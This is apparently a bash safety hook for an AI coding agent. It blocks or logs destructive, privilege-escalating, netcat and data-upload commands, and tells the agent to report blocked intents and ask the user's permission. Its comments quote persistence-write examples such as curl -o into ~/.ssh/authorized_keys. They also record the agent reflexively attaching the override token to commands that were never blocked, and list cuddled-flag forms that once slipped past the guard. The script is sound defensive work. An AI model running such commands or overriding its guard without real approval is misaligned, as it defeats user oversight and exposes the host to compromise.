#!/bin/bash
# Guard against potentially unsafe operations
# This hook validates commands before execution
# Exit codes: 0 = allow, 2 = block
#
# Behavior on block (2026-06-05 redesign):
#   When a command is blocked, the agent MUST NOT route around the guard by
#   using an equivalent tool/language (e.g. python urllib instead of curl).
#   Instead it must report to the user, verbatim, what it intended to do and
#   ask for explicit permission. The block() footer instructs this.
#
# One-shot approval:
#   After the user approves, re-run the SAME command with CLAUDE_GUARD_OVERRIDE=1
#   prepended (e.g. `CLAUDE_GUARD_OVERRIDE=1 curl -d ... https://...`). The guard
#   recognizes the inline token and allows that single invocation (logged). This
#   is NOT a persistent bypass — it must be present on each approved command.

# Read JSON input from stdin
INPUT=$(cat)

# Extract command from tool_input
COMMAND=$(echo "$INPUT" | jq -r '.tool_input.command // empty')

# If no command, allow (not a Bash command)
if [[ -z "$COMMAND" ]]; then
    exit 0
fi

# Log file for override usage
GUARD_LOG="${CLAUDE_GUARD_LOG:-$HOME/.claude/global-observation/guard-overrides.log}"

# =============================================================================
# ONE-SHOT APPROVAL — user-granted override for a single invocation
# =============================================================================
# The agent prepends CLAUDE_GUARD_OVERRIDE=1 as the FIRST token of the command,
# only AFTER the user explicitly approved the specific command it described.
# IMP-051: anchor the token to command-START so it authorizes exactly ONE command,
# not a whole script. `export CLAUDE_GUARD_OVERRIDE=1` on line 1 of a multi-line
# block (the old session-wide bypass) no longer matches, and a command that merely
# MENTIONS the token (echo/grep/comment) no longer false-logs an OVERRIDE-ALLOWED.
if [[ "$COMMAND" =~ ^[[:space:]]*CLAUDE_GUARD_OVERRIDE=1[[:space:]] ]]; then
    mkdir -p "$(dirname "$GUARD_LOG")" 2>/dev/null

    # IMP-118 (2026-08-01): distinguish a NEEDED override from a reflex one.
    # Four overrides were logged in one 15-minute window on plain
    # `grep -n … file | head -N` commands — which this guard does not block at
    # all (only cat/head-style whole-file reads are). The agent had been
    # blocked once for a `head`, then defensively prefixed everything after it.
    # That is not harmless: a reflex-prefixed token also sails past the reads
    # the guard SHOULD stop, and in the log a superfluous override is
    # indistinguishable from an approved one — so the audit trail overstates
    # how often the user actually authorized a bypass.
    # Re-run the classifier on the command with the token stripped; if nothing
    # would have fired, say so instead of silently recording an approval.
    # No recursion risk: the re-entered copy sees a command with no override
    # token, so it cannot reach this branch again. Costs one extra hook run per
    # override — and overrides are rare (132 in the log's entire history).
    _stripped="${COMMAND#*CLAUDE_GUARD_OVERRIDE=1 }"
    _verdict="OVERRIDE-ALLOWED"
    if [ -n "$_stripped" ] && [ "$_stripped" != "$COMMAND" ] && command -v jq >/dev/null 2>&1; then
        if jq -nc --arg c "$_stripped" '{tool_name:"Bash",tool_input:{command:$c}}' \
             | CLAUDE_GUARD_LOG=/dev/null bash "$0" >/dev/null 2>&1; then
            _verdict="OVERRIDE-UNNECESSARY"
        fi
    fi
    printf '%s\t%s\t%s\n' "$(date '+%Y-%m-%dT%H:%M:%S')" "$_verdict" "$COMMAND" >> "$GUARD_LOG" 2>/dev/null
    if [ "$_verdict" = "OVERRIDE-UNNECESSARY" ]; then
        echo "NOTE: guard-unsafe override token present but NOT needed — this command was never blocked. Drop the prefix; reflex-overriding erodes the guard (IMP-118, logged)." >&2
    else
        echo "NOTE: guard-unsafe override token present — allowing this single user-approved invocation (logged)." >&2
    fi
    exit 0
fi

# IMP-051: detect the OLD bare `export CLAUDE_GUARD_OVERRIDE=1` bypass attempt and
# warn (it no longer disarms the guard). Non-blocking hint; the real command is
# still classified normally below.
if [[ "$COMMAND" =~ (^|[[:space:]\;\&\|])export[[:space:]]+CLAUDE_GUARD_OVERRIDE=1 ]]; then
    echo "NOTE: 'export CLAUDE_GUARD_OVERRIDE=1' no longer grants a script-wide bypass (IMP-051). Prepend 'CLAUDE_GUARD_OVERRIDE=1 ' to the SINGLE command you want allowed." >&2
fi

# =============================================================================
# block() — emit a standardized block message and exit 2
# =============================================================================
# Usage: block "<one-line reason>" ["<optional extra body>"]
# The footer is identical for every block so the agent always sees the same
# instruction: do NOT work around it, report intent, ask permission.
block() {
    local reason="$1"
    local extra="$2"
    {
        echo "BLOCKED: $reason"
        if [[ -n "$extra" ]]; then
            echo "$extra"
        fi
        echo ""
        echo "──────────────────────────────────────────────────────────────"
        echo "DO NOT work around this block."
        echo "Specifically: do NOT achieve the same effect with a different"
        echo "tool or language (e.g. python/node/wget instead of curl, or a"
        echo "pipe/heredoc to dodge a file-read rule)."
        echo ""
        echo "Instead, STOP and do exactly this:"
        echo "  1. Tell the user, verbatim, the command you were about to run."
        echo "  2. Explain in one line what it would do and why you wanted it."
        echo "  3. Ask for explicit permission to proceed."
        echo ""
        echo "If the user approves, re-run the SAME command with"
        echo "  CLAUDE_GUARD_OVERRIDE=1  prepended (one-shot, logged)."
        echo "──────────────────────────────────────────────────────────────"
    } >&2
    exit 2
}

# =============================================================================
# soft_ack() — SOFT-ACK band (IMP-146): allow + log + one stderr NOTE line
# =============================================================================
# Usage: soft_ack "<short op label, e.g. curl-Upload/POST>"
#
# Reclassified from block() 2026-08-23 (IMP-146) for the curl/wget/scripted-HTTP
# data-upload arms below. Evidence: 24 legitimate API-test blocks (WHO-ICD token
# requests, Shopware smoketests) across 9 projects in the 02.–22.08 window, EVERY
# SINGLE ONE immediately overridden via CLAUDE_GUARD_OVERRIDE=1 in the same turn —
# zero net protection, and it trained a reflex-override habit indistinguishable
# in the log from a genuinely reviewed approval. Decision: rules/agency-bands.md,
# Decision Table row "curl/wget/HTTP-POST am Kommandokopf".
#
# Writes to the SAME GUARD_LOG file and 3-column tab format as the override log
# above (timestamp, decision, command) — "decision" reads "SOFT-ACK" here instead
# of "OVERRIDE-ALLOWED"/"OVERRIDE-UNNECESSARY". Unlike block(), this exits 0: the
# command proceeds, the NOTE is advisory-observable (per agency-bands.md's SOFT-ACK
# behavior — "do it; state intent... No y/n"), not a gate.
#
# The `curl -o` output-path arm and the netcat arm are DELIBERATELY untouched by
# this function — they stay BLOCK (see their own comments for why).
soft_ack() {
    local op_label="$1"
    mkdir -p "$(dirname "$GUARD_LOG")" 2>/dev/null
    local _host
    _host=$(printf '%s' "$COMMAND" | grep -oE '(https?://)[^[:space:]"'"'"']+' | head -1 | sed -E 's#^https?://##' | cut -d/ -f1)
    [[ -z "$_host" ]] && _host="(kein Ziel extrahierbar)"
    printf '%s\t%s\t%s\n' "$(date '+%Y-%m-%dT%H:%M:%S')" "SOFT-ACK" "$COMMAND" >> "$GUARD_LOG" 2>/dev/null
    echo "NOTE: ${op_label} erkannt (SOFT-ACK seit IMP-146) — Ziel prüfen: ${_host}" >&2
    exit 0
}

# =============================================================================
# COMMAND-POSITION NORMALIZATION (IMP-106)
# =============================================================================
# COMMAND_NORM strips heredoc bodies + quoted spans (they are DATA, not
# executed text) so the arms below classify what a command ACTUALLY RUNS,
# not what it merely echoes/greps/heredocs. Newlines are preserved so a bare
# newline still anchors as a command separator, same as ';'.
#
# CMDPOS is the command-position anchor, mirroring the mkfs arm (IMP-076)
# and excessive-agency-gate.sh's CP: true command position is the very
# start of the string, or immediately after ; & | or a real newline.
# [[:space:]]* absorbs any further gap. A repeated && / || needs no
# separate alternative — its SECOND & / | character re-anchors on its own
# (see excessive-agency-gate.sh's CP comment for the full reasoning).
#
# guard_normalize_command() fails OPEN toward the raw string on error, so a
# python3 outage degrades an arm back to its pre-fix (stricter, substring)
# behavior — never opens a hole.
# shellcheck source=lib/normalize-command.sh
source "$(cd "$(dirname "${BASH_SOURCE[0]}")" && pwd)/lib/normalize-command.sh"
COMMAND_NORM="$(guard_normalize_command "$COMMAND")"
_NL=$'\n'
CMDPOS="(^|[;&|${_NL}])[[:space:]]*"

# =============================================================================
# CRITICAL BLOCKERS - These commands are never allowed
# =============================================================================

# Destructive file system operations
#
# IMP-103: disposable-temp carve-out. This arm blocks a recursive force-delete of
# ANY absolute path, which also caught the session scratchpad (/private/tmp/claude-501/…)
# and every /tmp target — so a sub-agent could not clean up after itself. Because this
# arm runs FIRST in the PreToolUse|Bash chain, it also made the excessive-agency-gate's
# temp allowlist (IMP-059 glob-under-tmp, IMP-102 resolved roots) unreachable for
# absolute targets: the floor blocked them before that gate ever ran.
#
# Exempt ONLY the exact disposable temp roots, incl. their macOS-resolved /private
# forms. /private itself is NOT a temp root — /private/etc and /private/var/db stay
# blocked. Any target containing '..' stays blocked (traversal climbs out of the temp
# root). The bare-wildcard arm below is untouched.
_rm_disposable_temp() {   # $1 = target → 0 when disposable temp, 1 otherwise
    case "$1" in
        *..*)                                                     return 1 ;;
        /tmp|/tmp/*|/private/tmp|/private/tmp/*)                  return 0 ;;
        /var/tmp|/var/tmp/*|/private/var/tmp|/private/var/tmp/*)  return 0 ;;
        /var/folders/*|/private/var/folders/*)                    return 0 ;;
        *)                                                        return 1 ;;
    esac
}

# IMP-106: gate on COMMAND_NORM at command position (an "rm -rf /" that only
# EXISTS inside a quoted/heredoc string, e.g. echo 'rm -rf /', is data — it
# was already never matched by the literal (/|~|\$HOME) target requirement
# here, which requires an UNQUOTED target char immediately after "-rf ", so
# this source swap costs no coverage even for the quoted-target edge case).
if [[ "$COMMAND_NORM" =~ $CMDPOS"rm"[[:space:]]+-rf[[:space:]]+(/|~|\$HOME) ]]; then
    # Classify EVERY target this arm governs, not just the one that matched: a
    # command may carry several (`rm -rf /tmp/foo && rm -rf /etc`), and the
    # exemption may only apply when ALL of them are disposable.
    # Extraction also runs on COMMAND_NORM (IMP-106) — with quoted/heredoc
    # DATA already stripped, any remaining "rm -rf TARGET" substring is a
    # real invocation, not prose.
    _rm_critical=0
    while IFS= read -r _rm_target; do
        [[ -z "$_rm_target" ]] && continue
        case "$_rm_target" in
            /*|'~'|'~/'*|'$HOME'*|'${HOME}'*) ;;  # governed by this arm
            *) continue ;;                         # relative → never was this arm's concern
        esac
        if ! _rm_disposable_temp "$_rm_target"; then
            _rm_critical=1
        fi
    done < <(printf '%s' "$COMMAND_NORM" \
             | grep -oE 'rm[[:space:]]+-rf[[:space:]]+[^[:space:];&|]+' \
             | sed -E 's/^rm[[:space:]]+-rf[[:space:]]+//')

    if [[ "$_rm_critical" -eq 1 ]]; then
        block "Destructive rm -rf on critical path"
    fi
fi

if [[ "$COMMAND_NORM" =~ $CMDPOS"rm"[[:space:]]+-rf[[:space:]]+\* ]]; then
    block "Destructive rm -rf with wildcard"
fi

# Privilege escalation
if [[ "$COMMAND" =~ ^sudo[[:space:]] ]] || [[ "$COMMAND" =~ \|[[:space:]]*sudo ]]; then
    block "sudo commands require manual execution"
fi

if [[ "$COMMAND" =~ ^su[[:space:]] ]]; then
    block "su commands require manual execution"
fi

# Disk formatting and partition operations
# IMP-076: command-position match instead of bare substring — the old pattern
# blocked read-only commands that merely MENTION the tools (grep -n 'mkfs|fdisk',
# echo/python strings; reproduced live 2026-07-03). Now fires only when the tool
# is invoked: at command start or right after ; & | — followed by space or EOL
# (mkfs.ext4-style suffixes included).
if [[ "$COMMAND" =~ (^|[\;\&\|])[[:space:]]*(mkfs(\.[a-z0-9]+)?|fdisk|parted|gdisk)([[:space:]]|$) ]]; then
    block "Disk formatting commands require manual execution"
fi

# Raw disk writes (IMP-106: command-position anchor on "dd")
if [[ "$COMMAND_NORM" =~ $CMDPOS"dd"[[:space:]].*if= ]]; then
    block "dd commands require manual execution"
fi

# Writing to device files (except /dev/null and /dev/stdout which are safe)
# IMP-106: source swapped to COMMAND_NORM only (quote/heredoc data stripped).
# No CMDPOS anchor here — '>' is a redirect operator, not a command name; it
# can legitimately appear after ANY command word, so it has no "command
# position" to anchor to the way a program name does.
if [[ "$COMMAND_NORM" =~ \>[[:space:]]*/dev/ ]] && [[ ! "$COMMAND_NORM" =~ /dev/null ]] && [[ ! "$COMMAND_NORM" =~ /dev/stdout ]] && [[ ! "$COMMAND_NORM" =~ /dev/stderr ]]; then
    block "Writing to device files requires manual execution"
fi

# =============================================================================
# SECURITY SENSITIVE - Commands that could exfiltrate data
# =============================================================================
# NOTE: these patterns intentionally also catch the common work-around tools so
# the guard is consistent across languages, not just curl. If the agent reaches
# for an equivalent, it gets the same classification as curl.
#
# IMP-146 (2026-08-23): the data-upload/POST arms in this section (curl -d/-X,
# wget --post, scripted python/node HTTP-with-data) are SOFT-ACK, not BLOCK —
# see soft_ack()'s docstring above for why. The curl -o output-path arm and the
# netcat arm below stay BLOCK; they govern a different risk (writing to a
# critical filesystem path / opening a listening or reverse shell), not a
# reflexively-overridden network POST.

# Network exfiltration with curl/wget posting data
# Allow read-only GET curls (with optional -s/-L/-o flags writing to /tmp) —
# asset fetches (screenshots, public images) were blocked 72 times in the
# 30-day window ending 2026-04-20. See IMP-023.
#
# IMP-045 localhost carve-out: a request whose target host is loopback /
# local-dev (localhost, 127.0.0.1, 0.0.0.0, ::1, host.docker.internal) is a
# local smoke-test (per local-first-deploy.md), NOT external exfiltration.
# Detect it up front and skip the curl exfil arms for it. Non-local
# destinations are unaffected. The localhost token must appear as a URL host
# (after a scheme:// or //), not a bare substring, to avoid matching e.g. a
# remote path segment named "localhost".
CURL_LOCAL=0
if [[ "$COMMAND" =~ (https?://|//)(localhost|127\.0\.0\.1|0\.0\.0\.0|\[::1\]|::1|host\.docker\.internal)([:/[:space:]\"\']|$) ]]; then
    CURL_LOCAL=1
fi

# User-authorized generation APIs (approved 2026-07-28 for the an approved generation art
# pipeline). Same shape and rationale as the CURL_LOCAL carve-out above: these
# are explicitly provisioned endpoints, with keys the user created and stored in
# a chmod-600 gitignored .env, whose entire purpose is to receive image payloads
# (base64 sprite frames as conditioning input) and return generated art. Sending
# data there is the intended function, not exfiltration. Scope is deliberately
# two exact hosts — every other destination still hits the arms below.
# Remove this block to revert to the previous behavior.
CURL_ALLOWED_API=0
if [[ "$COMMAND" =~ (https?://|//)(api\.retrodiffusion\.ai|api\.x\.ai)([:/[:space:]\"\']|$) ]]; then
    CURL_ALLOWED_API=1
fi

# IMP-106: source swapped to COMMAND_NORM + command-position anchor on "curl"
# itself (mirrors the mkfs arm). CURL_LOCAL/CURL_ALLOWED_API above stay on the
# raw $COMMAND (unchanged, out of IMP-106 scope) — they are independent
# hostname carve-outs, not command-position classifiers.
#
# IMP-146 (2026-08-23): BLOCK → SOFT-ACK. See soft_ack()'s docstring above for
# the evidence. The curl -o output-path arm further below is UNCHANGED (still
# BLOCK) — it governs writes to critical filesystem paths, a different risk
# class from a network POST.
if [[ "$CURL_LOCAL" != 1 ]] && [[ "$CURL_ALLOWED_API" != 1 ]] && [[ "$COMMAND_NORM" =~ $CMDPOS"curl".*(-d|--data|-F|--form|--upload-file) ]]; then
    soft_ack "curl-Upload/POST"
fi

# Explicit non-GET methods — IMP-146: BLOCK → SOFT-ACK, same class as the
# data-upload arm above (both are "curl sends a mutating request"; splitting
# them by band would be an arbitrary distinction the evidence doesn't support).
if [[ "$CURL_LOCAL" != 1 ]] && [[ "$CURL_ALLOWED_API" != 1 ]] && [[ "$COMMAND_NORM" =~ $CMDPOS"curl".*(-X[[:space:]]*(POST|PUT|PATCH|DELETE)|--request[[:space:]]*(POST|PUT|PATCH|DELETE)) ]]; then
    soft_ack "curl-Upload/POST"
fi

# Block curl output writes outside /tmp (read-only downloads to /tmp are OK).
# IMP-047: gate on CURL_LOCAL like the -d/-X arms above — localhost output writes
# (e.g. `curl -o /dev/null -w %{http_code} http://127.0.0.1:8000/...` health checks)
# were false-blocked because this arm ignored the localhost carve-out.
# IMP-106: the initial gate is anchored on COMMAND_NORM; the OUTPATH
# extraction below deliberately stays on the RAW $COMMAND — COMMAND_NORM has
# quoted spans removed entirely, and a quoted -o target (`-o "/etc/x"`)
# would lose its path text there, not just its quote characters.
#
# IMP-147 (2026-08-24, measured 2026-08-24): the old single-string classifier
# `! "$OUTPATH" =~ ^/tmp/|^\./|^[^/]|^/dev/null$` was an UNGROUPED alternation
# — `^[^/]` (meant as "relative path") actually matches ANY string that does
# not start with '/', including `~/.ssh/authorized_keys` and `$HOME/.bashrc`.
# Measured live: `curl -o ~/.ssh/authorized_keys http://x` and
# `curl -o $HOME/.bashrc http://x` both passed (exit 0) — a classic
# persistence/profile-takeover write, silently allowed. Rewritten below to
# classify EVERY extracted -o/--output target individually (a command can
# carry more than one — `curl -o /dev/null -o /etc/x ...` — and the previous
# single-string regex only ever inspected the concatenated multi-line blob,
# so a second dangerous target was caught only by accident of how `^`/`$`
# happened to anchor against the combined string, not by design).
#
# -O / --remote-name takes NO argument — it always writes to the CWD, derived
# from the URL's basename. It is deliberately left OUT of the per-target
# extraction below (which only pulls -o/--output values): there is no path
# argument to misclassify, and "writes to CWD" is definitionally a relative,
# project-local write. It still participates in the OUTER trigger regex
# purely to decide whether this arm block runs at all; when a command uses
# -O with no accompanying -o/--output, the extraction below correctly finds
# ZERO targets and the fail-closed check further down is defined not to fire
# for that case (see the comment at _curl_o_lines).
#
# IMP-148 (2026-08-24): the trigger + extraction above only recognized the
# SPACE-separated form (`-o PATH`, `--output PATH`). curl's own short-option
# parser also accepts the CUDDLED form with no space at all (`-oPATH`) —
# measured live: `curl -oREALFILE ...` writes to REALFILE exactly like
# `-o REALFILE`. `curl -o/etc/passwd http://x` reached real execution
# (exit 0) before this fix. Two more forms were checked live rather than
# assumed (curl 8.7.1, macOS, 2026-08-24) before deciding how to cover them:
#   - `-o=PATH` (short option, cuddled '='): curl's short-option parser does
#     NOT treat '=' as a separator — everything after `-o` becomes the
#     literal value UNCHANGED. Verified: `curl -o=curl_eq_test_out ...`
#     wrote a file literally named `=curl_eq_test_out` in the CWD, NOT to a
#     file named `curl_eq_test_out`. So `-o=/etc/passwd` does not write to
#     `/etc/passwd` — it writes to a RELATIVE file named `=/etc/passwd` in
#     the CWD. No special-casing is needed for this: it is already covered
#     by the same cuddled pattern as `-oPATH` below (the char right after
#     `-o` is simply `=` instead of `/`), and the '=' is deliberately NOT
#     stripped during extraction — stripping it would misclassify a
#     harmless relative write as if it targeted the literal absolute path.
#   - `--output=PATH` (long option, GNU `=`-style): curl's LONG-option
#     parser was tested and REJECTS this outright for every long option
#     tried, not just --output (`--output=x`, `--url=x`, `--max-time=2` all
#     errored "option ...: is unknown" — curl requires a separate argument
#     token for long options, no `--opt=value` support in this build). A
#     command using this form never actually executes the write. Coverage
#     is added below anyway as defense-in-depth (a different curl build, or
#     a future one, cannot be assumed against by a static hook) — since the
#     underlying command fails to run either way, classifying it costs
#     nothing and can only ever over-block a no-op, never under-block a
#     real write.
if [[ "$CURL_LOCAL" != 1 ]] && [[ "$COMMAND_NORM" =~ $CMDPOS"curl".*((-o|--output)[[:space:]]+[^[:space:]]+|-o[^[:space:]]|--output=[^[:space:]]+|(-O|--remote-name)[[:space:]]+[^[:space:]]+) ]]; then
    # Extract every -o/--output target on the RAW command (see comment above
    # for why RAW, not COMMAND_NORM). Three separate passes, one per form,
    # each strips exactly its own prefix — a shared strip would either eat
    # the literal '=' the cuddled short form is required to KEEP (see
    # IMP-148 above) or fail to eat the '=' the long-eq form is required to
    # DROP. `(^|[[:space:];&|])` anchors each match to a genuine flag-token
    # boundary so `-o` does not also match the "-o" substring buried inside
    # "--output" itself (which would otherwise misparse "--output /x" as a
    # bogus cuddled `-o` with value "utput"). Grep-then-sed on an empty
    # match yields ZERO lines, not a blank placeholder — so a form that
    # simply isn't present in this command contributes nothing, and does
    # not falsely trip the fail-closed check further down. Strip one layer
    # of surrounding quote characters at the end so a quoted target
    # (`-o "~/.ssh/id_rsa"`) cannot dodge classification merely by starting
    # with a quote instead of '~' or '/'.
    _curl_o_lines=$(
        {
            printf '%s' "$COMMAND" \
                | grep -oE "(^|[[:space:];&|])(-o|--output)[[:space:]]+[^[:space:];&|]+" \
                | sed -E 's/^[[:space:];&|]*(-o|--output)[[:space:]]+//'
            printf '%s' "$COMMAND" \
                | grep -oE "(^|[[:space:];&|])-o[^[:space:];&|]+" \
                | sed -E 's/^[[:space:];&|]*-o//'
            printf '%s' "$COMMAND" \
                | grep -oE "(^|[[:space:];&|])--output=[^[:space:];&|]+" \
                | sed -E 's/^[[:space:];&|]*--output=//'
        } | sed -E 's/^["'"'"']//; s/["'"'"']$//'
    )

    _curl_outpath_critical=0
    if [[ -n "$_curl_o_lines" ]]; then
        # -o/--output IS present in the raw command (this is not the
        # -O-only case) — every extracted target below must classify to
        # either the explicit safe-sink allowlist or "critical". A target
        # that comes out blank after stripping is unclassifiable and fails
        # CLOSED (critical), never silently allowed.
        while IFS= read -r _outpath; do
            if [[ -z "$_outpath" ]]; then
                _curl_outpath_critical=1
                continue
            fi
            case "$_outpath" in
                # Home-boundary writes are NEVER in the allowlist, tilde or
                # $HOME/${HOME} form — no "~/tmp is a free pass" carve-out.
                '~'*|'$HOME'*|'${HOME}'*)
                    _curl_outpath_critical=1 ;;
                # Explicit safe sinks: disposable temp dirs, /dev/null
                # (IMP-047 — a discard sink for status-code checks, not a
                # written file), and '-' (stdout).
                /tmp/*|/var/tmp/*|'$TMPDIR'*|'${TMPDIR}'*|/dev/null|-)
                    ;;
                # Any other absolute path is critical (was the `/etc/passwd`
                # case that already blocked correctly — unchanged).
                /*)
                    _curl_outpath_critical=1 ;;
                # Genuine relative path (out.txt, ./out.txt, dist/bundle.js,
                # ../sibling/x) — lands in the project being worked on.
                *)
                    ;;
            esac
        done <<< "$_curl_o_lines"
    fi

    if [[ "$_curl_outpath_critical" -eq 1 ]]; then
        block "curl -o writing outside /tmp or relative path requires manual execution"
    fi
fi

# IMP-146: BLOCK → SOFT-ACK, consistent with the curl arms above (same class,
# same 24-block evidence base — wget --post is the wget-shaped equivalent of a
# curl data upload).
if [[ "$COMMAND_NORM" =~ $CMDPOS"wget".*--post ]]; then
    soft_ack "wget-POST"
fi

# Equivalent HTTP-with-embedded-data work-arounds (python/node) — same class as
# the curl data-upload block above. Catches the most common dodges so the guard
# is not trivially bypassable. GET-only one-liners are NOT matched here.
#
# IMP-045 relax: an authenticated READ-ONLY GET (Authorization header but no
# request body / no mutating method) to a docs/registry host is legitimate and
# must NOT be blocked. So the data-detection arm triggers only on a genuine
# body/payload or an explicit mutating method — NOT on the mere presence of a
# header (headers=/Authorization removed from the trigger set). A localhost
# target is exempt entirely (local dev). Genuine exfil (data= / json= / body: /
# -d / POST|PUT|PATCH|DELETE) to a non-local host still blocks.
# IMP-106: source swapped to COMMAND_NORM; the interpreter-name alternation
# is anchored at command position. The data-indicator check (second [[ ]])
# stays unanchored on COMMAND_NORM — it only needs to see a genuine
# data/method token somewhere in the SAME (data-stripped) command.
# IMP-146: BLOCK → SOFT-ACK, consistent with the curl/wget arms above (same
# class of op, same evidence base — this arm exists specifically as "the
# python/node equivalent of the curl data-upload arm", so it moves with it).
if [[ "$CURL_LOCAL" != 1 ]] && [[ "$CURL_ALLOWED_API" != 1 ]] \
   && [[ "$COMMAND_NORM" =~ $CMDPOS(python3?|node|deno|ruby|perl).*(urlopen|requests\.(post|put|patch|delete)|http\.client|fetch\(|axios\.) ]] \
   && [[ "$COMMAND_NORM" =~ (data=|json=|body:|-d[[:space:]]|POST|PUT|PATCH|DELETE) ]]; then
    soft_ack "scripted HTTP request mit Daten (python/node-Äquivalent zu curl-Upload)"
fi

# Reverse shells and netcat.
# IMP-106: upgraded from a bare word-boundary check (start-of-command OR any
# preceding whitespace — which still matched "nc" inside an unquoted-looking
# but actually-quoted prose string, e.g. echo 'benutze nc -l zum testen') to
# a real command-position anchor on COMMAND_NORM, mirroring the mkfs arm.
if [[ "$COMMAND_NORM" =~ $CMDPOS(nc|netcat|ncat)([[:space:]]|$) ]]; then
    block "netcat commands require manual execution"
fi

# SSH key operations (IMP-106: command-position anchor on "ssh-keygen")
if [[ "$COMMAND_NORM" =~ $CMDPOS"ssh-keygen".*-f ]]; then
    block "SSH key generation requires manual execution"
fi

# =============================================================================
# GIT DANGEROUS OPERATIONS - These need extra caution (warn, do not block)
# =============================================================================

if [[ "$COMMAND" =~ git[[:space:]]+push[[:space:]]+--force ]]; then
    echo "WARNING: Force push detected - proceeding with caution" >&2
    # Allow but warn - could also block via block() to be strict
fi

if [[ "$COMMAND" =~ git[[:space:]]+reset[[:space:]]+--hard ]]; then
    echo "WARNING: Hard reset detected - uncommitted changes will be lost" >&2
fi

if [[ "$COMMAND" =~ git[[:space:]]+clean[[:space:]]+-fd ]]; then
    echo "WARNING: Clean with -fd will delete untracked files and directories" >&2
fi

# =============================================================================
# ENVIRONMENT VARIABLE EXPOSURE (warn, do not block)
# =============================================================================

if [[ "$COMMAND" =~ (printenv|env)[[:space:]]*$ ]] || [[ "$COMMAND" =~ echo[[:space:]]+\$[A-Z_]*KEY ]] || [[ "$COMMAND" =~ echo[[:space:]]+\$[A-Z_]*SECRET ]] || [[ "$COMMAND" =~ echo[[:space:]]+\$[A-Z_]*TOKEN ]]; then
    echo "WARNING: Potential secret exposure in command" >&2
    # Allow but warn - secrets should be in .env files
fi

# =============================================================================
# REMOVED (IMP-157, 2026-08-24, second half): file-read Bash patterns are no
# longer blocked at the CRITICAL floor.
# =============================================================================
# IMP-034/IMP-040 used to block bare `cat FILE` / `head FILE` / non-follow
# `tail FILE` here, on the theory that Read/Grep are the dedicated-tool
# equivalent (tool-discipline.md Rule 2). That was a CATEGORY ERROR: this
# file is the CRITICAL floor per rules/agency-bands.md — "never-allow
# hard-block" reserved for host destruction, exfiltration, and irreversible
# filesystem damage. A `cat` of a readable file is none of those; it is a
# TOOL-STYLE preference, not a safety property, and enforcing a style
# preference at the safety floor makes the floor itself something to be
# routed around.
#
# MEASURED (chat-corpus analysis, Aug 2026): 9 confirmed blocks across 8
# sessions over two months, incl. `cat rcode/VERSION`, `head -5 LICENSE &&
# echo "---" && head -60 README.md`, `head -40 .../scripts/publish.sh`, and
# `tail -c 1200 /private/tmp/.../scratchpad` — the last one blocking the
# agent from reading its OWN task output in the session scratchpad. Worse:
# this framework's own Auto-Mode system reminder instructs the opposite —
# "read files with cat, head, or sed -n ... rather than using the dedicated
# Read tool" — so the agent received two contradictory standing orders from
# two parts of the same framework, and every hit burned a turn on the block
# footer's report-and-ask ritual for what is, at worst, a style violation.
#
# The underlying concern (dedicated tools cache better, handle large files
# better, are cheaper per-token for repeat access) is real and NOT dropped —
# it moved to an ADVISORY: hooks/read-tool-preference-advisory.sh (PreToolUse
# on Bash, registered alongside this hook in settings.json). It never blocks
# (always exit 0), fires at most once per session, and states the conflict
# instead of hiding it. rules/tool-discipline.md Rule 2 now says explicitly
# that this is a preference, not a floor-enforced rule.
#
# The IMP-082 global-observation telemetry carve-out that used to sit above
# this block is gone too — there is nothing left here for it to carve an
# exception FROM.
# =============================================================================

# =============================================================================
# SAFE - Allow the command
# =============================================================================

exit 0
